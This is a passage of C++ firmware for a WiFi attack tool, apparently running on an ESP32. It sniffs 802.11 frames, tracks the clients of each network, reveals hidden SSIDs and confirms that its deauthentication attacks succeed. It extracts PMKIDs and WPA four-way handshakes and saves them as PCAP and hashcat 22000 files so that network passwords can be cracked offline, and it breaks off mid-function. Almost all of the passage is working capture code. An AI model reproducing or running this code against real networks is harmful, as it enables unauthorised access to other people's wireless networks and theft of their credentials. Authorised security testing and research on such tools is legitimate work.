            // Free previous if exists (defensive)
            if (beaconFrame) {
                free(beaconFrame);
                beaconFrame = nullptr;
            }
            // Allocate and copy beacon frame
            beaconFrame = (uint8_t*)malloc(len);
            if (beaconFrame) {
                memcpy(beaconFrame, payload, len);
                beaconFrameLen = len;
                beaconCaptured = true;
                queueLog("[OINK] Beacon captured for %s (%d bytes)", target->ssid, len);
            }
        }
    }
    
    int idx = findNetwork(bssid);
    
    if (idx < 0) {
        // New network
        DetectedNetwork net = {0};
        memcpy(net.bssid, bssid, 6);
        net.rssi = rssi;
        net.lastSeen = millis();
        net.beaconCount = 1;
        net.isTarget = false;
        net.hasPMF = hasPMF;
        net.hasHandshake = false;
        net.attackAttempts = 0;
        net.isHidden = false;
        net.clientCount = 0;
        
        // Parse SSID from IE
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0) {
                if (ieLen > 0 && ieLen <= 32) {
                    memcpy(net.ssid, payload + offset + 2, ieLen);
                    net.ssid[ieLen] = 0;
                    
                    // Check for all-null SSID (also hidden)
                    bool allNull = true;
                    for (uint8_t i = 0; i < ieLen; i++) {
                        if (net.ssid[i] != 0) { allNull = false; break; }
                    }
                    if (allNull) {
                        net.isHidden = true;
                    }
                } else if (ieLen == 0) {
                    // Hidden network (zero-length SSID)
                    net.isHidden = true;
                }
                // If ieLen > 32, ignore malformed SSID
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        // Check if we already have a handshake for this network
        net.hasHandshake = hasHandshakeFor(bssid);
        
        // Extract features for ML
        net.features = FeatureExtractor::extractFromBeacon(payload, len, rssi);
        
        // Get channel from DS Parameter Set IE
        offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (id == 3 && ieLen == 1) {  // DS Parameter Set
                net.channel = payload[offset + 2];
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        // Parse auth mode from RSN (0x30) and WPA (0xDD) IEs
        net.authmode = WIFI_AUTH_OPEN;  // Default to open
        offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0x30 && ieLen >= 2) {  // RSN IE = WPA2/WPA3
                // Check for WPA3 (SAE in AKM suite)
                // For simplicity, assume RSN = WPA2, PMF = WPA3
                if (net.hasPMF) {
                    net.authmode = WIFI_AUTH_WPA3_PSK;
                } else {
                    net.authmode = WIFI_AUTH_WPA2_PSK;
                }
            } else if (id == 0xDD && ieLen >= 8) {  // Vendor specific
                // Check for WPA1 OUI: 00:50:F2:01
                if (payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 &&
                    payload[offset + 4] == 0xF2 && payload[offset + 5] == 0x01) {
                    // WPA1 - only set if not already WPA2
                    if (net.authmode == WIFI_AUTH_OPEN) {
                        net.authmode = WIFI_AUTH_WPA_PSK;
                    } else if (net.authmode == WIFI_AUTH_WPA2_PSK) {
                        net.authmode = WIFI_AUTH_WPA_WPA2_PSK;
                    }
                }
            }
            
            offset += 2 + ieLen;
        }
        
        if (net.channel == 0) {
            net.channel = currentChannel;
        }
        
        // Limit network count to prevent OOM
        // NOTE: Don't do vector erase in callback - just drop if at capacity
        // The update() loop handles cleanup of stale networks
        size_t maxNetworks = Config::wifi().doNoHam ? DNH_MAX_NETWORKS : MAX_NETWORKS;
        if (networks.size() >= maxNetworks) {
            // At capacity - skip adding new network (update() will clean stale ones)
            return;
        }
        
        // Also check heap - ESP.getFreeHeap() is safe to call from callback
        if (ESP.getFreeHeap() < HEAP_MIN_THRESHOLD) {
            return;  // Memory critically low - skip network add
        }
        
        // DEFERRED: Queue network add for main thread (avoids vector realloc in callback)
        if (!pendingNetworkAdd) {
            memcpy(&pendingNetwork, &net, sizeof(DetectedNetwork));
            
            // Queue mood event data - pass empty string for hidden networks so XP system tracks ghosts
            strncpy(pendingNetworkSSID, net.ssid, 32);
            pendingNetworkSSID[32] = 0;
            pendingNetworkRSSI = net.rssi;
            pendingNetworkChannel = net.channel;
            pendingNewNetwork = true;
            pendingNetworkAdd = true;
            
            queueLog("[OINK] New network: %s (ch%d, %ddBm%s)", 
                     net.ssid[0] ? net.ssid : "<hidden>", net.channel, net.rssi,
                     net.hasPMF ? " PMF" : "");
        }
    } else {
        // Update existing
        networks[idx].rssi = rssi;
        networks[idx].lastSeen = millis();
        networks[idx].beaconCount++;
        networks[idx].hasPMF = hasPMF;  // Update PMF status
    }
}

void OinkMode::processProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Probe responses reveal hidden SSIDs
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    int idx = findNetwork(bssid);
    if (idx < 0) return;  // Only update existing networks
    
    // If network has hidden SSID, try to extract from probe response
    if (networks[idx].ssid[0] == 0 || networks[idx].isHidden) {
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen <= 32) {
                memcpy(networks[idx].ssid, payload + offset + 2, ieLen);
                networks[idx].ssid[ieLen] = 0;
                networks[idx].isHidden = false;
                
                // DEFERRED: Queue mood event for main thread
                if (!pendingNewNetwork) {
                    strncpy(pendingNetworkSSID, networks[idx].ssid, 32);
                    pendingNetworkSSID[32] = 0;
                    pendingNetworkRSSI = rssi;
                    pendingNetworkChannel = networks[idx].channel;
                    pendingNewNetwork = true;
                }
                queueLog("[OINK] Hidden SSID revealed: %s", networks[idx].ssid);
                break;
            }
            
            offset += 2 + ieLen;
        }
    }
    
    networks[idx].lastSeen = millis();
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Extract addresses based on ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    const uint8_t* bssid = nullptr;
    const uint8_t* clientMac = nullptr;
    
    // Address layout depends on ToDS/FromDS:
    // ToDS=0, FromDS=1: Addr1=DA(client), Addr2=BSSID, Addr3=SA
    // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
    if (!toDs && fromDs) {
        // From AP to client
        bssid = payload + 10;      // Addr2
        clientMac = payload + 4;   // Addr1 (destination = client)
    } else if (toDs && !fromDs) {
        // From client to AP
        bssid = payload + 4;       // Addr1
        clientMac = payload + 10;  // Addr2 (source = client)
    }
    
    // Track client if we identified both
    if (bssid && clientMac) {
        // Don't track broadcast/multicast
        if ((clientMac[0] & 0x01) == 0) {
            trackClient(bssid, clientMac, rssi);
        }
    }
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data frame (subtype has bit 3 set = 0x08, 0x09, etc.)
    // Frame control byte 0: bits 4-7 = subtype, bit 3 of subtype = QoS
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    bool isQoS = (subtype & 0x08) != 0;
    if (isQoS) {
        offset += 2;  // QoS control field
    }
    
    // Check for HTC field (High Throughput Control, +HTC/Order bit)
    // Only present in QoS data frames when Order bit (bit 7 of FC byte 1) is set
    if (isQoS && (payload[1] & 0x80)) {
        offset += 4;  // HTC field
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        // This is EAPOL!
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac) {
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) return;  // Only interested in EAPOL-Key
    
    if (len < 99) return;  // Minimum EAPOL-Key frame
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) messageNum = 1;
    else if (!keyAck && keyMic && !install) messageNum = 2;
    else if (keyAck && keyMic && install) messageNum = 3;
    else if (!keyAck && keyMic && secure) messageNum = 4;
    
    if (messageNum == 0) return;
    
    // Determine which is AP (sender of M1/M3) and station
    uint8_t bssid[6], station[6];
    if (messageNum == 1 || messageNum == 3) {
        memcpy(bssid, srcMac, 6);
        memcpy(station, dstMac, 6);
    } else {
        memcpy(bssid, dstMac, 6);
        memcpy(station, srcMac, 6);
    }
    
    // M1 = AP initiating handshake = client reconnected after deauth!
    // If we're deauthing this target, our deauth worked!
    if (messageNum == 1 && deauthing && targetIndex >= 0 && targetIndex < (int)networks.size()) {
        if (memcmp(bssid, networks[targetIndex].bssid, 6) == 0) {
            // DEFERRED: Queue deauth success for main thread
            if (!pendingDeauthSuccess) {
                memcpy(pendingDeauthStation, station, 6);
                pendingDeauthSuccess = true;
            }
            queueLog("[OINK] Deauth confirmed! Client %02X:%02X:%02X:%02X:%02X:%02X reconnecting",
                     station[0], station[1], station[2], station[3], station[4], station[5]);
        }
    }
    
    // ========== PMKID EXTRACTION FROM M1 ==========
    // PMKID is in Key Data field of M1 when AP supports it (WPA2/WPA3 only)
    // EAPOL-Key frame: descriptor_type(1) @ offset 4, key_data_length(2) @ offset 97-98, key_data @ offset 99
    // Key Data contains RSN IE with PMKID: dd 14 00 0f ac 04 [16-byte PMKID]
    // Only RSN (descriptor type 0x02) has PMKID - WPA1 (0xFE) does not
    uint8_t descriptorType = payload[4];
    if (messageNum == 1 && descriptorType == 0x02 && len >= 121) {  // RSN + 99 + 22 bytes minimum
        uint16_t keyDataLen = (payload[97] << 8) | payload[98];
        
        // PMKID Key Data is exactly 22 bytes: dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
        if (keyDataLen >= 22 && len >= 99 + keyDataLen) {
            const uint8_t* keyData = payload + 99;
            
            // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
            // Can appear at start or within Key Data
            for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {
                if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                    keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                    keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
                    
                    // Found PMKID KDE! Extract the 16 bytes
                    const uint8_t* pmkidData = keyData + i + 6;
                    
                    // Check if PMKID is all zeros (some APs send empty PMKID KDE)
                    bool allZeros = true;
                    for (int z = 0; z < 16; z++) {
                        if (pmkidData[z] != 0) { allZeros = false; break; }
                    }
                    if (allZeros) {
                        Serial.printf("[OINK] PMKID KDE found but all zeros (ignored)\n");
                        break;  // Skip invalid PMKID
                    }
                    
                    // Check if we already have this PMKID (lookup only - no push_back)
                    int pmkIdx = findOrCreatePMKID(bssid, station);
                    if (pmkIdx >= 0 && !pmkids[pmkIdx].saved) {
                        // Existing PMKID entry - update it directly (field writes are safe)
                        CapturedPMKID& p = pmkids[pmkIdx];
                        memcpy(p.pmkid, pmkidData, 16);
                        p.timestamp = millis();
                        
                        // Look up SSID
                        if (p.ssid[0] == 0) {
                            int netIdx = findNetwork(bssid);
                            if (netIdx >= 0) {
                                strncpy(p.ssid, networks[netIdx].ssid, 32);
                                p.ssid[32] = 0;
                            }
                        }
                        
                        queueLog("[OINK] PMKID captured! SSID:%s BSSID:%02X:%02X:%02X:%02X:%02X:%02X",
                                 p.ssid[0] ? p.ssid : "?",
                                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                        
                        // DEFERRED: Queue PMKID event for main thread (3 beeps!)
                        if (!pendingPMKIDCapture) {
                            strncpy(pendingPMKIDSSID, p.ssid, 32);
                            pendingPMKIDSSID[32] = 0;
                            pendingPMKIDCapture = true;
                        }
                    } else if (pmkIdx < 0) {
                        // New PMKID - queue for creation in main thread
                        if (!pendingPMKIDCreateBusy && !pendingPMKIDCreateReady) {
                            memcpy(pendingPMKIDCreate.bssid, bssid, 6);
                            memcpy(pendingPMKIDCreate.station, station, 6);
                            memcpy(pendingPMKIDCreate.pmkid, pmkidData, 16);
                            // Get SSID
                            int netIdx = findNetwork(bssid);
                            if (netIdx >= 0) {
                                strncpy(pendingPMKIDCreate.ssid, networks[netIdx].ssid, 32);
                                pendingPMKIDCreate.ssid[32] = 0;
                            } else {
                                pendingPMKIDCreate.ssid[0] = 0;
                            }
                            pendingPMKIDCreateReady = true;
                            
                            queueLog("[OINK] PMKID queued for creation");
                            
                            // Also queue the mood event
                            if (!pendingPMKIDCapture) {
                                strncpy(pendingPMKIDSSID, pendingPMKIDCreate.ssid, 32);
                                pendingPMKIDSSID[32] = 0;
                                pendingPMKIDCapture = true;
                            }
                        }
                    }
                    break;  // Found it, stop searching
                }
            }
        }
    }
    
    // Find or create handshake entry (lookup only - no push_back)
    int hsIdx = findOrCreateHandshake(bssid, station);
    
    if (hsIdx >= 0) {
        // Existing handshake entry - update it directly (field writes are safe)
        CapturedHandshake& hs = handshakes[hsIdx];
        
        // Store this frame
        uint8_t frameIdx = messageNum - 1;
        uint16_t copyLen = min((uint16_t)512, len);
        memcpy(hs.frames[frameIdx].data, payload, copyLen);
        hs.frames[frameIdx].len = copyLen;
        hs.frames[frameIdx].messageNum = messageNum;
        hs.frames[frameIdx].timestamp = millis();
        
        // Update mask
        hs.capturedMask |= (1 << frameIdx);
        hs.lastSeen = millis();
        
        // Look up SSID from networks if not set
        if (hs.ssid[0] == 0) {
            int netIdx = findNetwork(bssid);
            if (netIdx >= 0) {
                strncpy(hs.ssid, networks[netIdx].ssid, 32);
                hs.ssid[32] = 0;  // Ensure null termination
            }
        }
        
        queueLog("[OINK] EAPOL M%d captured! SSID:%s BSSID:%02X:%02X:%02X:%02X:%02X:%02X [%s%s%s%s]",
                 messageNum, 
                 hs.ssid[0] ? hs.ssid : "?",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                 hs.hasM1() ? "1" : "-",
                 hs.hasM2() ? "2" : "-",
                 hs.hasM3() ? "3" : "-",
                 hs.hasM4() ? "4" : "-");
        
        // Only trigger mood + beep when handshake becomes complete (not for each frame)
        // DEFERRED: Queue handshake event for main thread (avoids String ops in callback)
        // NOTE: autoSaveCheck() is called from main loop, not here (callback context)
        if (hs.isComplete() && !hs.saved) {
            if (!pendingHandshakeComplete) {
                strncpy(pendingHandshakeSSID, hs.ssid, 32);
                pendingHandshakeSSID[32] = 0;
                pendingHandshakeComplete = true;
            }
            pendingAutoSave = true;  // Queue auto-save for main loop
        }
    } else {
        // New handshake - queue for creation in main thread
        if (!pendingHandshakeCreateBusy && !pendingHandshakeCreateReady) {
            memcpy(pendingHandshakeCreate.bssid, bssid, 6);
            memcpy(pendingHandshakeCreate.station, station, 6);
            pendingHandshakeCreate.messageNum = messageNum;
            
            // Copy EAPOL frame
            uint16_t copyLen = min((uint16_t)sizeof(pendingHandshakeCreate.eapolData), len);
            memcpy(pendingHandshakeCreate.eapolData, payload, copyLen);
            pendingHandshakeCreate.eapolLen = copyLen;
            
            // Check if this M1 has PMKID already extracted (handled above)
            pendingHandshakeCreate.hasPMKID = false;  // PMKID handled separately
            
            pendingHandshakeCreateReady = true;
            queueLog("[OINK] EAPOL M%d queued for creation", messageNum);
        }
    }
}

int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
    // CALLBACK VERSION: Lookup only, no push_back
    // If not found, returns -1 and caller must queue to pendingHandshakeCreate
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            return i;
        }
    }
    return -1;  // Not found - caller must queue for creation in main thread
}

int OinkMode::findOrCreatePMKID(const uint8_t* bssid, const uint8_t* station) {
    // CALLBACK VERSION: Lookup only, no push_back
    // If not found, returns -1 and caller must queue to pendingPMKIDCreate
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            return i;
        }
    }
    return -1;  // Not found - caller must queue for creation in main thread
}

// Safe versions for main thread use (does vector operations safely)
int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* station) {
    // This version is ONLY called from update() in main loop context
    // It's safe to do vector operations here
    
    // Look for existing
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            return i;
        }
    }
    
    // Limit check
    if (handshakes.size() >= MAX_HANDSHAKES) {
        return -1;
    }
    
    // Create new entry
    CapturedHandshake hs = {0};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.station, station, 6);
    hs.capturedMask = 0;
    hs.firstSeen = millis();
    hs.lastSeen = millis();
    hs.saved = false;
    hs.beaconData = nullptr;
    hs.beaconLen = 0;
    
    // Attach beacon if available
    if (beaconCaptured && beaconFrame && beaconFrameLen > 0) {
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, bssid, 6) == 0) {
            hs.beaconData = (uint8_t*)malloc(beaconFrameLen);
            if (hs.beaconData) {
                memcpy(hs.beaconData, beaconFrame, beaconFrameLen);
                hs.beaconLen = beaconFrameLen;
            }
        }
    }
    
    handshakes.push_back(hs);
    return handshakes.size() - 1;
}

int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station) {
    // This version is ONLY called from update() in main loop context
    
    // Look for existing
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            return i;
        }
    }
    
    // Limit check
    if (pmkids.size() >= MAX_PMKIDS) {
        return -1;
    }
    
    // Create new entry
    CapturedPMKID p = {0};
    memcpy(p.bssid, bssid, 6);
    memcpy(p.station, station, 6);
    p.timestamp = millis();
    p.saved = false;
    
    pmkids.push_back(p);
    return pmkids.size() - 1;
}

uint16_t OinkMode::getCompleteHandshakeCount() {
    uint16_t count = 0;
    for (const auto& hs : handshakes) {
        if (hs.isComplete()) count++;
    }
    return count;
}

// LOCKING state queries for display
bool OinkMode::isLocking() {
    return running && autoState == AutoState::LOCKING;
}

const char* OinkMode::getTargetSSID() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        return networks[targetIndex].ssid;
    }
    return "";
}

uint8_t OinkMode::getTargetClientCount() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        return networks[targetIndex].clientCount;
    }
    return 0;
}

void OinkMode::autoSaveCheck() {
    // Check if SD card is available
    if (!Config::isSDAvailable()) {
        return;
    }
    
    // Save any unsaved complete handshakes
    for (auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved) {
            // Generate filename
            char filename[64];
            snprintf(filename, sizeof(filename), "/handshakes/%02X%02X%02X%02X%02X%02X.pcap",
                    hs.bssid[0], hs.bssid[1], hs.bssid[2],
                    hs.bssid[3], hs.bssid[4], hs.bssid[5]);
            
            // Ensure directory exists
            if (!SD.exists("/handshakes")) {
                SD.mkdir("/handshakes");
            }
            
            // Save PCAP (for wireshark/manual analysis)
            bool pcapOk = saveHandshakePCAP(hs, filename);
            
            // Save 22000 format (hashcat-ready, no conversion needed)
            char filename22000[64];
            snprintf(filename22000, sizeof(filename22000), "/handshakes/%02X%02X%02X%02X%02X%02X_hs.22000",
                    hs.bssid[0], hs.bssid[1], hs.bssid[2],
                    hs.bssid[3], hs.bssid[4], hs.bssid[5]);
            bool hs22kOk = saveHandshake22000(hs, filename22000);
            
            if (pcapOk || hs22kOk) {
                hs.saved = true;
                Serial.printf("[OINK] Handshake saved: %s (pcap:%s 22000:%s)\n", 
                              filename, pcapOk ? "OK" : "FAIL", hs22kOk ? "OK" : "FAIL");
                SDLog::log("OINK", "Handshake saved: %s (pcap:%s 22000:%s)", 
                           hs.ssid, pcapOk ? "OK" : "FAIL", hs22kOk ? "OK" : "FAIL");
                
                // Save SSID to companion .txt file for later reference
                char txtFilename[64];
                snprintf(txtFilename, sizeof(txtFilename), "/handshakes/%02X%02X%02X%02X%02X%02X.txt",
                        hs.bssid[0], hs.bssid[1], hs.bssid[2],
                        hs.bssid[3], hs.bssid[4], hs.bssid[5]);
                File txtFile = SD.open(txtFilename, FILE_WRITE);
                if (txtFile) {
                    txtFile.println(hs.ssid);
                    txtFile.close();
                }
            }
        }
    }
    
    // Also save any unsaved PMKIDs
    saveAllPMKIDs();
}

// PCAP file format structures
#pragma pack(push, 1)
struct PCAPHeader {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PCAPPacketHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

void OinkMode::writePCAPHeader(fs::File& f) {
    PCAPHeader hdr = {
        .magic = 0xA1B2C3D4,      // PCAP magic
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .linktype = 105           // LINKTYPE_IEEE802_11 (802.11)
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

void OinkMode::writePCAPPacket(fs::File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
    PCAPPacketHeader pkt = {
        .ts_sec = ts / 1000,
        .ts_usec = (ts % 1000) * 1000,
        .incl_len = len,
        .orig_len = len
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    f.write(data, len);
}

bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        Serial.printf("[OINK] Failed to create PCAP: %s\n", path);
        return false;
    }
    
    writePCAPHeader(f);
    
    int packetCount = 0;
    
    // Write beacon frame first (required for hashcat to crack)
    // Try per-handshake beacon first, fall back to global
    if (hs.hasBeacon()) {
        writePCAPPacket(f, hs.beaconData, hs.beaconLen, hs.firstSeen);
        packetCount++;
        Serial.println("[OINK] Per-handshake beacon written to PCAP");
    } else if (beaconCaptured && beaconFrame && beaconFrameLen > 0) {
        // Verify global beacon is from same BSSID as handshake
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, hs.bssid, 6) == 0) {
            writePCAPPacket(f, beaconFrame, beaconFrameLen, hs.firstSeen);
            packetCount++;
            Serial.println("[OINK] Global beacon written to PCAP");
        }
    }
    
    // Build 802.11 data frame + EAPOL for each captured message
    // We need to reconstruct the full frame for PCAP
    
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        
        const EAPOLFrame& frame = hs.frames[i];
        if (frame.len == 0) continue;
        
        // Build fake 802.11 Data frame header + LLC/SNAP + EAPOL
        uint8_t pkt[600];
        uint16_t pktLen = 0;
        
        // 802.11 Data frame header (24 bytes)
        // Frame Control: Type=Data(0x08), Flags in byte[1]
        // Byte[1] bits: ToDS=bit0, FromDS=bit1
        pkt[0] = 0x08;
        pkt[2] = 0x00; pkt[3] = 0x00;  // Duration
        
        // Addresses depend on message direction
        // IEEE 802.11 address fields:
        // ToDS=0, FromDS=1: Addr1=DA, Addr2=BSSID, Addr3=SA
        // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA, Addr3=DA
        if (i == 0 || i == 2) {  // M1, M3: AP->Station (FromDS=1, ToDS=0)
            pkt[1] = 0x02;  // FromDS=1, ToDS=0
            memcpy(pkt + 4, hs.station, 6);   // Addr1 = DA (destination = station)
            memcpy(pkt + 10, hs.bssid, 6);    // Addr2 = BSSID (source = AP)
            memcpy(pkt + 16, hs.bssid, 6);    // Addr3 = SA (source address)
        } else {  // M2, M4: Station->AP (ToDS=1, FromDS=0)
            pkt[1] = 0x01;  // ToDS=1, FromDS=0
            memcpy(pkt + 4, hs.bssid, 6);     // Addr1 = BSSID (receiver = AP)
            memcpy(pkt + 10, hs.station, 6);  // Addr2 = SA (transmitter = station)
            memcpy(pkt + 16, hs.bssid, 6);    // Addr3 = DA (destination = BSSID)
        }
        
        pkt[22] = 0x00; pkt[23] = 0x00;  // Sequence
        pktLen = 24;
        
        // LLC/SNAP header (8 bytes)
        pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
        pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
        pkt[30] = 0x88; pkt[31] = 0x8E;  // EAPOL ethertype
        pktLen = 32;
        
        // EAPOL data
        if (32 + frame.len > sizeof(pkt)) continue;  // Bounds check
        memcpy(pkt + 32, frame.data, frame.len);
        pktLen += frame.len;
        
        writePCAPPacket(f, pkt, pktLen, frame.timestamp);
        packetCount++;
        Serial.printf("[OINK] EAPOL M%d written to PCAP (%d bytes)\n", i + 1, pktLen);
    }
    
    Serial.printf("[OINK] PCAP saved with %d packets (mask: %s%s%s%s)\n", 
                 packetCount,
                 hs.hasM1() ? "M1" : "",
                 hs.hasM2() ? "M2" : "",
                 hs.hasM3() ? "M3" : "",
                 hs.hasM4() ? "M4" : "");
    
    f.close();
    return true;
}

bool OinkMode::saveAllHandshakes() {
    bool success = true;
    autoSaveCheck();  // This saves any unsaved ones
    return success;
}

bool OinkMode::savePMKID22000(const CapturedPMKID& p, const char* path) {
    // Save PMKID in hashcat 22000 format:
    // WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
    
    // Safety check: don't save all-zero PMKIDs (invalid/empty)
    bool allZeros = true;
    for (int i = 0; i < 16; i++) {
        if (p.pmkid[i] != 0) { allZeros = false; break; }
    }
    if (allZeros) {
        Serial.printf("[OINK] Skipping save of all-zero PMKID\n");
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);;
    if (!f) {
        Serial.printf("[OINK] Failed to create PMKID file: %s\n", path);
        return false;
    }
    
    // Build the hash line
    // PMKID (16 bytes as 32 hex chars)
    char pmkidHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(pmkidHex + i*2, "%02x", p.pmkid[i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars, no colons)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            p.bssid[0], p.bssid[1], p.bssid[2], 
            p.bssid[3], p.bssid[4], p.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            p.station[0], p.station[1], p.station[2], 
            p.station[3], p.station[4], p.station[5]);
    
    // ESSID (hex-encoded)
    char essidHex[65];
    int ssidLen = strlen(p.ssid);
    for (int i = 0; i < ssidLen && i < 32; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)p.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // Write: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***01
    // MESSAGEPAIR 01 = PMKID taken from AP
    f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macClient, essidHex);
    
    f.close();
    Serial.printf("[OINK] PMKID saved to %s (hashcat -m 22000)\n", path);
    return true;
}

bool OinkMode::saveHandshake22000(const CapturedHandshake& hs, const char* path) {
    // Save handshake in hashcat 22000 format:
    // WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR
    //
    // Supported message pairs:
    // - 0x00: M1+M2 (ANonce from M1, EAPOL+MIC from M2) - most common
    // - 0x02: M2+M3 (ANonce from M3, EAPOL+MIC from M2) - fallback
    
    uint8_t msgPair = hs.getMessagePair();
    if (msgPair == 0xFF) {
        Serial.printf("[OINK] No valid message pair for 22000 export\n");
        return false;
    }
    
    // Determine which frames to use
    const EAPOLFrame* nonceFrame = nullptr;  // M1 or M3 (contains ANonce)
    const EAPOLFrame* eapolFrame = nullptr;  // M2 (contains MIC + full EAPOL)
    
    if (msgPair == 0x00) {
        // M1+M2: ANonce from M1, EAPOL from M2
        nonceFrame = &hs.frames[0];  // M1
        eapolFrame = &hs.frames[1];  // M2
    } else {
        // M2+M3: ANonce from M3, EAPOL from M2
        nonceFrame = &hs.frames[2];  // M3
        eapolFrame = &hs.frames[1];  // M2
    }
    
    if (nonceFrame->len < 51 || eapolFrame->len < 95) {
        Serial.printf("[OINK] Frame too short for 22000 export (nonce:%d eapol:%d)\n",
                      nonceFrame->len, eapolFrame->len);
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        Serial.printf("[OINK] Failed to create 22000 file: %s\n", path);
        return false;
    }
    
    // Extract MIC from M2 EAPOL frame (offset 81, 16 bytes)
    // EAPOL-Key: ver(1)+type(1)+len(2)+desc(1)+keyinfo(2)+keylen(2)+replay(8)+nonce(32)+iv(16)+rsc(8)+reserved(8)+MIC(16)
